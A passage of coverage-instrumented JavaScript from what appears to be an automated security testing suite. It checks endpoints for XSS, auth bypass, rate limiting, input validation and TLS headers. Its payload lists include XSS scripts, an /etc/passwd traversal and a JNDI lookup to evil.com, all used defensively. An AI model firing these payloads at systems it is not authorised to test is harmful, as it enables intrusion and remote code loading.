   * Test for XSS vulnerabilities
   */
  async testXSSVulnerabilities(endpoint) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[14]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[80]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[81]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[82]++, []);
    const xssPayloads =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[83]++, ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "<img src=x onerror=alert('XSS')>", "';alert('XSS');//"]);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[84]++;
    try {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[85]++;
      for (const payload of xssPayloads) {
        const response =
        /* istanbul ignore next */
        (cov_20fguhnp3o().s[86]++, await this.sendTestRequest(endpoint, {
          input: payload
        }));
        /* istanbul ignore next */
        cov_20fguhnp3o().s[87]++;
        if (this.detectXSSVulnerability(response, payload)) {
          /* istanbul ignore next */
          cov_20fguhnp3o().b[25][0]++;
          cov_20fguhnp3o().s[88]++;
          findings.push({
            id: crypto.randomUUID(),
            type: 'XSS',
            severity: 'HIGH',
            description: `XSS vulnerability detected with payload: ${payload}`,
            location: endpoint,
            evidence:
            /* istanbul ignore next */
            (cov_20fguhnp3o().b[26][0]++, response.data?.toString().substring(0, 500)) ||
            /* istanbul ignore next */
            (cov_20fguhnp3o().b[26][1]++, ''),
            remediation: 'Implement output encoding and Content Security Policy'
          });
        } else
        /* istanbul ignore next */
        {
          cov_20fguhnp3o().b[25][1]++;
        }
      }
      /* istanbul ignore next */
      cov_20fguhnp3o().s[89]++;
      return {
        testId,
        testName: 'XSS Vulnerability Test',
        category: 'API_SECURITY',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[27][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[27][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[28][0]++, 'HIGH') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[28][1]++, 'LOW'),
        description: 'Tests for Cross-Site Scripting vulnerabilities',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[29][0]++, ['Implement output encoding', 'Use Content Security Policy headers', 'Validate and sanitize all user inputs']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[29][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[90]++;
      this.logger.error('XSS test failed', {
        endpoint,
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[91]++;
      return this.createErrorTestResult(testId, 'XSS Vulnerability Test', error);
    }
  }
  /**
   * Test authentication bypass vulnerabilities
   */
  async testAuthenticationBypass(endpoint) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[15]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[92]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[93]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[94]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[95]++;
    try {
      // Test without authentication
      const noAuthResponse =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[96]++, await this.sendTestRequest(endpoint, {}, {}));
      /* istanbul ignore next */
      cov_20fguhnp3o().s[97]++;
      if (noAuthResponse.status === 200) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[30][0]++;
        cov_20fguhnp3o().s[98]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'AUTH_BYPASS',
          severity: 'CRITICAL',
          description: 'Endpoint accessible without authentication',
          location: endpoint,
          evidence: `HTTP ${noAuthResponse.status} response received`,
          remediation: 'Implement proper authentication checks'
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[30][1]++;
      }
      // Test with invalid tokens
      const invalidTokenResponse =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[99]++, await this.sendTestRequest(endpoint, {}, {
        Authorization: 'Bearer invalid_token_12345'
      }));
      /* istanbul ignore next */
      cov_20fguhnp3o().s[100]++;
      if (invalidTokenResponse.status === 200) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[31][0]++;
        cov_20fguhnp3o().s[101]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'AUTH_BYPASS',
          severity: 'CRITICAL',
          description: 'Endpoint accepts invalid authentication tokens',
          location: endpoint,
          evidence: `HTTP ${invalidTokenResponse.status} with invalid token`,
          remediation: 'Implement proper token validation'
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[31][1]++;
      }
      cov_20fguhnp3o().s[102]++;
      return {
        testId,
        testName: 'Authentication Bypass Test',
        category: 'API_SECURITY',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[32][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[32][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[33][0]++, 'CRITICAL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[33][1]++, 'LOW'),
        description: 'Tests for authentication bypass vulnerabilities',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[34][0]++, ['Implement robust authentication mechanisms', 'Validate all authentication tokens', 'Use secure session management']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[34][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[103]++;
      this.logger.error('Authentication bypass test failed', {
        endpoint,
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[104]++;
      return this.createErrorTestResult(testId, 'Authentication Bypass Test', error);
    }
  }
  /**
   * Test rate limiting implementation
   */
  async testRateLimiting(endpoint) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[16]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[105]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[106]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[107]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[108]++;
    try {
      // Send rapid requests to test rate limiting
      const requests =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[109]++, Array(100).fill(null).map(() => {
        /* istanbul ignore next */
        cov_20fguhnp3o().f[17]++;
        cov_20fguhnp3o().s[110]++;
        return this.sendTestRequest(endpoint, {}).catch(err => {
          /* istanbul ignore next */
          cov_20fguhnp3o().f[18]++;
          cov_20fguhnp3o().s[111]++;
          return {
            status:
            /* istanbul ignore next */
            (cov_20fguhnp3o().b[35][0]++, err.response?.status) ||
            /* istanbul ignore next */
            (cov_20fguhnp3o().b[35][1]++, 0)
          };
        });
      }));
      const responses =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[112]++, await Promise.all(requests));
      const rateLimitedResponses =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[113]++, responses.filter(r => {
        /* istanbul ignore next */
        cov_20fguhnp3o().f[19]++;
        cov_20fguhnp3o().s[114]++;
        return r.status === 429;
      }));
      /* istanbul ignore next */
      cov_20fguhnp3o().s[115]++;
      if (rateLimitedResponses.length === 0) {
        /* istanbul ignore next */
        cov_20fguhnp3o().b[36][0]++;
        cov_20fguhnp3o().s[116]++;
        findings.push({
          id: crypto.randomUUID(),
          type: 'RATE_LIMITING',
          severity: 'MEDIUM',
          description: 'No rate limiting detected on endpoint',
          location: endpoint,
          evidence: `${responses.length} requests sent, 0 rate limited`,
          remediation: 'Implement rate limiting to prevent abuse'
        });
      } else
      /* istanbul ignore next */
      {
        cov_20fguhnp3o().b[36][1]++;
      }
      cov_20fguhnp3o().s[117]++;
      return {
        testId,
        testName: 'Rate Limiting Test',
        category: 'API_SECURITY',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[37][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[37][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[38][0]++, 'MEDIUM') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[38][1]++, 'LOW'),
        description: 'Tests for proper rate limiting implementation',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[39][0]++, ['Implement rate limiting middleware', 'Use sliding window or token bucket algorithms', 'Return appropriate HTTP 429 responses']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[39][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[118]++;
      this.logger.error('Rate limiting test failed', {
        endpoint,
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[119]++;
      return this.createErrorTestResult(testId, 'Rate Limiting Test', error);
    }
  }
  /**
   * Test input validation
   */
  async testInputValidation(endpoint) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[20]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[120]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[121]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[122]++, []);
    const maliciousInputs =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[123]++, ['../../../etc/passwd', '${jndi:ldap://evil.com/a}', '{{7*7}}', '<script>alert(1)</script>', 'A'.repeat(10000) // Buffer overflow test
    ]);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[124]++;
    try {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[125]++;
      for (const input of maliciousInputs) {
        const response =
        /* istanbul ignore next */
        (cov_20fguhnp3o().s[126]++, await this.sendTestRequest(endpoint, {
          data: input
        }));
        /* istanbul ignore next */
        cov_20fguhnp3o().s[127]++;
        if (
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[41][0]++, response.status === 500) ||
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[41][1]++, this.detectInputValidationIssue(response))) {
          /* istanbul ignore next */
          cov_20fguhnp3o().b[40][0]++;
          cov_20fguhnp3o().s[128]++;
          findings.push({
            id: crypto.randomUUID(),
            type: 'INPUT_VALIDATION',
            severity: 'HIGH',
            description: `Input validation issue detected with input: ${input.substring(0, 50)}`,
            location: endpoint,
            evidence:
            /* istanbul ignore next */
            (cov_20fguhnp3o().b[42][0]++, response.data?.toString().substring(0, 500)) ||
            /* istanbul ignore next */
            (cov_20fguhnp3o().b[42][1]++, ''),
            remediation: 'Implement comprehensive input validation and sanitization'
          });
        } else
        /* istanbul ignore next */
        {
          cov_20fguhnp3o().b[40][1]++;
        }
      }
      /* istanbul ignore next */
      cov_20fguhnp3o().s[129]++;
      return {
        testId,
        testName: 'Input Validation Test',
        category: 'API_SECURITY',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[43][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[43][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[44][0]++, 'HIGH') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[44][1]++, 'LOW'),
        description: 'Tests for proper input validation',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[45][0]++, ['Implement strict input validation', 'Use allowlist validation approach', 'Sanitize all user inputs']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[45][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[130]++;
      this.logger.error('Input validation test failed', {
        endpoint,
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[131]++;
      return this.createErrorTestResult(testId, 'Input Validation Test', error);
    }
  }
  /**
   * Test TLS/HTTPS security
   */
  async testTLSSecurity(endpoint) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[21]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[132]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[133]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[134]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[135]++;
    try {
      // Test if HTTP version is accessible
      const httpEndpoint =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[136]++, endpoint.replace('https://', 'http://'));
      /* istanbul ignore next */
      cov_20fguhnp3o().s[137]++;
      try {
        const httpResponse =
        /* istanbul ignore next */
        (cov_20fguhnp3o().s[138]++, await axios_1.default.get(httpEndpoint, {
          timeout: 5000
        }));
        /* istanbul ignore next */
        cov_20fguhnp3o().s[139]++;
        if (httpResponse.status === 200) {
          /* istanbul ignore next */
          cov_20fguhnp3o().b[46][0]++;
          cov_20fguhnp3o().s[140]++;
          findings.push({
            id: crypto.randomUUID(),
            type: 'TLS_SECURITY',
            severity: 'HIGH',
            description: 'Endpoint accessible over unencrypted HTTP',
            location: httpEndpoint,
            evidence: `HTTP ${httpResponse.status} response received`,
            remediation: 'Enforce HTTPS-only access with HSTS headers'
          });
        } else
        /* istanbul ignore next */
        {
          cov_20fguhnp3o().b[46][1]++;
        }
      } catch (error) {
        // HTTP not accessible is good
      }
      // Test HTTPS configuration
      const httpsResponse =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[141]++, await axios_1.default.get(endpoint, {
        timeout: 5000
      }));
      // Check for security headers
      const securityHeaders =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[142]++, ['strict-transport-security', 'x-content-type-options', 'x-frame-options', 'x-xss-protection']);
      /* istanbul ignore next */
      cov_20fguhnp3o().s[143]++;
      for (const header of securityHeaders) {
        /* istanbul ignore next */
        cov_20fguhnp3o().s[144]++;
        if (!httpsResponse.headers[header]) {
          /* istanbul ignore next */
          cov_20fguhnp3o().b[47][0]++;
          cov_20fguhnp3o().s[145]++;
          findings.push({
            id: crypto.randomUUID(),
            type: 'SECURITY_HEADERS',
            severity: 'MEDIUM',
            description: `Missing security header: ${header}`,
            location: endpoint,
            evidence: `Header ${header} not present in response`,
            remediation: `Add ${header} security header`
          });
        } else
        /* istanbul ignore next */
        {
          cov_20fguhnp3o().b[47][1]++;
        }
      }
      /* istanbul ignore next */
      cov_20fguhnp3o().s[146]++;
      return {
        testId,
        testName: 'TLS Security Test',
        category: 'API_SECURITY',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[48][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[48][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[49][0]++, 'HIGH') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[49][1]++, 'LOW'),
        description: 'Tests for proper TLS/HTTPS security configuration',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[50][0]++, ['Enforce HTTPS-only access', 'Implement HSTS headers', 'Add comprehensive security headers']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[50][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[147]++;
      this.logger.error('TLS security test failed', {
        endpoint,
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[148]++;
      return this.createErrorTestResult(testId, 'TLS Security Test', error);
    }
  }
  /**
   * Run vulnerability scanning
   */
  async runVulnerabilityScanning() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[22]++;
    const results =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[149]++, []);
    // Dependency vulnerability scanning
    /* istanbul ignore next */
    cov_20fguhnp3o().s[150]++;
    results.push(await this.scanDependencyVulnerabilities());
    // Configuration security scanning
    /* istanbul ignore next */
    cov_20fguhnp3o().s[151]++;
    results.push(await this.scanConfigurationSecurity());
    // File system security scanning
    /* istanbul ignore next */
    cov_20fguhnp3o().s[152]++;
    results.push(await this.scanFileSystemSecurity());
    /* istanbul ignore next */
    cov_20fguhnp3o().s[153]++;
    return results;
  }
  /**
   * Scan for dependency vulnerabilities
   */
  async scanDependencyVulnerabilities() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[23]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[154]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[155]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[156]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[157]++;
    try {
      // This would integrate with npm audit or similar tools
      // For now, we'll simulate the scanning process
      const packageJson =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[158]++, require('../../package.json'));
      const dependencies =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[159]++, {
        ...packageJson.dependencies,
        ...packageJson.devDependencies
      });
      // Simulate vulnerability detection
      /* istanbul ignore next */
      cov_20fguhnp3o().s[160]++;
      for (const [pkg, version] of Object.entries(dependencies)) {
        /* istanbul ignore next */
        cov_20fguhnp3o().s[161]++;
        if (this.isVulnerablePackage(pkg, version)) {
          /* istanbul ignore next */
          cov_20fguhnp3o().b[51][0]++;
          cov_20fguhnp3o().s[162]++;
          findings.push({
            id: crypto.randomUUID(),
            type: 'DEPENDENCY_VULNERABILITY',
            severity: 'HIGH',
            description: `Vulnerable dependency detected: ${pkg}@${version}`,
            location: 'package.json',
            evidence: `Package ${pkg} version ${version} has known vulnerabilities`,
            remediation: `Update ${pkg} to latest secure version`
          });
        } else
        /* istanbul ignore next */
        {
          cov_20fguhnp3o().b[51][1]++;
        }
      }
      /* istanbul ignore next */
      cov_20fguhnp3o().s[163]++;
      return {
        testId,
        testName: 'Dependency Vulnerability Scan',
        category: 'VULNERABILITY_SCAN',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[52][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[52][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[53][0]++, 'HIGH') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[53][1]++, 'LOW'),
        description: 'Scans for vulnerabilities in project dependencies',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[54][0]++, ['Update vulnerable dependencies', 'Use npm audit to check for vulnerabilities', 'Implement automated dependency scanning in CI/CD']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[54][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[164]++;
      this.logger.error('Dependency vulnerability scan failed', {
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[165]++;
      return this.createErrorTestResult(testId, 'Dependency Vulnerability Scan', error);
    }
  }
  /**
   * Scan configuration security
   */
  async scanConfigurationSecurity() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[24]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[166]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[167]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[168]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[169]++;
    try {
      // Check for hardcoded secrets
      const configFiles =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[170]++, ['.env', '.env.example', 'src/config/']);
      /* istanbul ignore next */
      cov_20fguhnp3o().s[171]++;
      for (const file of configFiles) {
        const secrets =
        /* istanbul ignore next */
        (cov_20fguhnp3o().s[172]++, await this.scanForHardcodedSecrets(file));
        /* istanbul ignore next */
        cov_20fguhnp3o().s[173]++;
        findings.push(...secrets);
      }
      // Check for insecure configurations
      const insecureConfigs =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[174]++, await this.scanForInsecureConfigurations());
      /* istanbul ignore next */
      cov_20fguhnp3o().s[175]++;
      findings.push(...insecureConfigs);
      /* istanbul ignore next */
      cov_20fguhnp3o().s[176]++;
      return {
        testId,
        testName: 'Configuration Security Scan',
        category: 'VULNERABILITY_SCAN',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[55][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[55][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[56][0]++, 'HIGH') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[56][1]++, 'LOW'),
        description: 'Scans for security issues in configuration files',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[57][0]++, ['Remove hardcoded secrets', 'Use environment variables for sensitive data', 'Implement secure configuration management']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[57][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[177]++;
      this.logger.error('Configuration security scan failed', {
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[178]++;
      return this.createErrorTestResult(testId, 'Configuration Security Scan', error);
    }
  }
  /**
   * Scan file system security
   */
  async scanFileSystemSecurity() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[25]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[179]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[180]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[181]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[182]++;
    try {
      // Check file permissions
      const permissionIssues =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[183]++, await this.scanFilePermissions());
      /* istanbul ignore next */
      cov_20fguhnp3o().s[184]++;
      findings.push(...permissionIssues);
      // Check for sensitive files
      const sensitiveFiles =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[185]++, await this.scanForSensitiveFiles());
      /* istanbul ignore next */
      cov_20fguhnp3o().s[186]++;
      findings.push(...sensitiveFiles);
      /* istanbul ignore next */
      cov_20fguhnp3o().s[187]++;
      return {
        testId,
        testName: 'File System Security Scan',
        category: 'VULNERABILITY_SCAN',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[58][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[58][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[59][0]++, 'MEDIUM') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[59][1]++, 'LOW'),
        description: 'Scans for file system security issues',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[60][0]++, ['Fix file permission issues', 'Remove or secure sensitive files', 'Implement proper access controls']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[60][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[188]++;
      this.logger.error('File system security scan failed', {
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[189]++;
      return this.createErrorTestResult(testId, 'File System Security Scan', error);
    }
  }
  /**
   * Run compliance tests
   */
  async runComplianceTests() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[26]++;
    const results =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[190]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[191]++;
    for (const standard of this.config.complianceStandards) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[192]++;
      results.push(await this.runComplianceTest(standard));
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[193]++;
    return results;
  }
  /**
   * Run specific compliance test
   */
  async runComplianceTest(standard) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[27]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[194]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[195]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[196]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[197]++;
    try {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[198]++;
      switch (standard) {
        case 'OWASP_TOP_10':
          /* istanbul ignore next */
          cov_20fguhnp3o().b[61][0]++;
          cov_20fguhnp3o().s[199]++;
          findings.push(...(await this.checkOWASPCompliance()));
          /* istanbul ignore next */
          cov_20fguhnp3o().s[200]++;
          break;
        case 'ISO_27001':
          /* istanbul ignore next */
          cov_20fguhnp3o().b[61][1]++;
          cov_20fguhnp3o().s[201]++;
          findings.push(...(await this.checkISO27001Compliance()));
          /* istanbul ignore next */
          cov_20fguhnp3o().s[202]++;
          break;
        case 'SOC_2':
          /* istanbul ignore next */
          cov_20fguhnp3o().b[61][2]++;
          cov_20fguhnp3o().s[203]++;
          findings.push(...(await this.checkSOC2Compliance()));
          /* istanbul ignore next */
          cov_20fguhnp3o().s[204]++;
          break;
        default:
          /* istanbul ignore next */
          cov_20fguhnp3o().b[61][3]++;
          cov_20fguhnp3o().s[205]++;
          this.logger.warn(`Unknown compliance standard: ${standard}`);
      }
      /* istanbul ignore next */
      cov_20fguhnp3o().s[206]++;
      return {
        testId,
        testName: `${standard} Compliance Test`,
        category: 'COMPLIANCE',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[62][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[62][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[63][0]++, 'HIGH') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[63][1]++, 'LOW'),
        description: `Tests compliance with ${standard} standard`,
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[64][0]++, [`Address ${standard} compliance gaps`, 'Implement required security controls', 'Document compliance procedures']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[64][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[207]++;
      this.logger.error(`${standard} compliance test failed`, {
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[208]++;
      return this.createErrorTestResult(testId, `${standard} Compliance Test`, error);
    }
  }
  /**
   * Run penetration tests
   */
  async runPenetrationTests() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[28]++;
    const results =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[209]++, []);
    // Network penetration testing
    /* istanbul ignore next */
    cov_20fguhnp3o().s[210]++;
    results.push(await this.runNetworkPenetrationTest());
    // Application penetration testing
    /* istanbul ignore next */
    cov_20fguhnp3o().s[211]++;
    results.push(await this.runApplicationPenetrationTest());
    // Social engineering simulation
    /* istanbul ignore next */
    cov_20fguhnp3o().s[212]++;
    results.push(await this.runSocialEngineeringTest());
    /* istanbul ignore next */
    cov_20fguhnp3o().s[213]++;
    return results;
  }
  /**
   * Run network penetration test
   */
  async runNetworkPenetrationTest() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[29]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[214]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[215]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[216]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[217]++;
    try {
      // Port scanning simulation
      const openPorts =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[218]++, await this.scanOpenPorts());
      /* istanbul ignore next */
      cov_20fguhnp3o().s[219]++;
      for (const port of openPorts) {
        /* istanbul ignore next */
        cov_20fguhnp3o().s[220]++;
        if (this.isUnnecessaryPort(port)) {
          /* istanbul ignore next */
          cov_20fguhnp3o().b[65][0]++;
          cov_20fguhnp3o().s[221]++;
          findings.push({
            id: crypto.randomUUID(),
            type: 'NETWORK_SECURITY',
            severity: 'MEDIUM',
            description: `Unnecessary port ${port} is open`,
            location: `Network port ${port}`,
            evidence: `Port ${port} responds to connections`,
            remediation: `Close unnecessary port ${port} or implement proper access controls`
          });
        } else
        /* istanbul ignore next */
        {
          cov_20fguhnp3o().b[65][1]++;
        }
      }
      /* istanbul ignore next */
      cov_20fguhnp3o().s[222]++;
      return {
        testId,
        testName: 'Network Penetration Test',
        category: 'PENETRATION',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[66][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[66][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[67][0]++, 'MEDIUM') :
        /* istanbul ignore next */
